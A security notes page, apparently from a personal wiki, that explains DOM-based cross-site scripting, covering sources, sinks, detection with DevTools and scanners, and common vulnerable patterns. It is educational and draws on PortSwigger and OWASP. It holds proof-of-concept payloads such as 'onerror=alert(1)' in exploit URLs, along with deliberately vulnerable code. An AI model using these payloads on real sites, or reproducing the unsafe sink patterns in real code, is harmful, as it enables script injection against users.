# DOM-Based XSS

← [[XSS-Overview]]

---

DOM XSS is different from reflected and stored XSS — the payload never touches the server. It's entirely processed by client-side JavaScript, making it invisible to server-side input validation and WAFs.

---

## The Core Difference

```
Reflected/Stored XSS:
  User input → Server → HTML response → Browser executes

DOM XSS:
  User input → Client-side JS → DOM modification → Browser executes
  (server never sees the payload)
```

---

## Sources and Sinks

DOM XSS requires two things:

**A source** — where attacker-controlled input comes from:
```javascript
document.URL
document.location
document.location.href
document.location.hash
document.location.search
document.referrer
window.name
location.hash
location.search
```

**A sink** — where the input is written in an unsafe way:
```javascript
document.write()             // writes HTML directly
document.writeln()
element.innerHTML            // sets raw HTML
element.outerHTML
element.insertAdjacentHTML()
eval()                       // executes JS string
setTimeout(string, ...)      // executes string as JS
setInterval(string, ...)
location.href = ...          // navigation sink
location.assign()
location.replace()
```

---

## Finding DOM XSS

### Manual Analysis

1. Find JavaScript files that read from URL-based sources
2. Trace the data flow to a dangerous sink

```javascript
// Vulnerable example:
var name = document.location.hash.slice(1);  // reads URL fragment
document.getElementById('greeting').innerHTML = 'Hello ' + name;  // writes to innerHTML

// Exploit URL:
https://example.com/page#<img src=x onerror=alert(1)>
```

### Using Browser DevTools

1. Open DevTools → Console
2. Search the Sources for dangerous sinks: `innerHTML`, `document.write`, `eval`
3. Set breakpoints and trace data flow
4. Check if user-controlled values reach these sinks

```javascript
// In console, override sinks to detect usage:
var originalWrite = document.write;
document.write = function(s) { console.trace('document.write: ' + s); originalWrite(s); };
```

### Automated Scanning

```bash
# DOM Invader (Burp Suite Pro feature)
# Opens a browser with instrumented sinks — detects DOM XSS automatically

# dalfox — DOM XSS scanner
dalfox url "https://example.com/page" --skip-bav

# retire.js — flags JS libs with known DOM XSS issues
retire --path ./js_files/
```

---

## Common DOM XSS Patterns

### URL Hash-Based

```javascript
// App reads hash to show content (e.g., tab navigation)
var tab = location.hash.substring(1);
document.getElementById('content').innerHTML = content[tab];

// Exploit: append #<img src=x onerror=alert(1)> to URL
```

### `document.write` with `document.URL`

```javascript
document.write("<script src='/utils.js?nonce=" + document.URL + "'><\/script>");

// If URL contains "></script><script>alert(1)</script>
```

### jQuery `$(location.hash)` (Classic)

Older jQuery versions execute `$(selector)` where the selector can be HTML. If `location.hash` is passed directly:

```javascript
$(location.hash).show()

// Exploit:
https://example.com#<img src=x onerror=alert(1)>
```

### `postMessage` Without Origin Check

```javascript
window.addEventListener('message', function(event) {
  // No origin check!
  document.getElementById('output').innerHTML = event.data;
});

// From another page:
targetWindow.postMessage('<img src=x onerror=alert(1)>', '*');
```

---

## DOM XSS vs Reflected XSS: Spotting the Difference

| | Reflected | DOM |
|--|-----------|-----|
| Payload in server response? | Yes | No |
| Server-side validation helps? | Yes | No |
| WAF can catch it? | Usually | No |
| Found in URL? | Query string | Usually fragment (`#`) |
| Tools to find | Scanner, grep | DevTools, manual JS review |

> [!NOTE]
> The URL fragment (`#...`) is never sent to the server — it exists only in the browser. That's why DOM XSS via `location.hash` is purely client-side and completely invisible to server-side defenses.

---

## Prototype Pollution → DOM XSS

Prototype pollution vulnerabilities can chain into DOM XSS when the polluted property ends up in a dangerous sink.

```javascript
// If ?__proto__[innerHTML]=<img src=x onerror=alert(1)> 
// can pollute Object.prototype.innerHTML
// and a gadget later does: element[userControlledKey] = value
// the innerHTML property on any element might get polluted
```

This is advanced — see [[Prototype-Pollution]] for details.

---

*Back to [[XSS-Overview]] | Related: [[Reflected-XSS]] | [[Stored-XSS]] | [[Prototype-Pollution]]*

*Sources: PortSwigger Web Security Academy, OWASP DOM XSS Cheat Sheet*
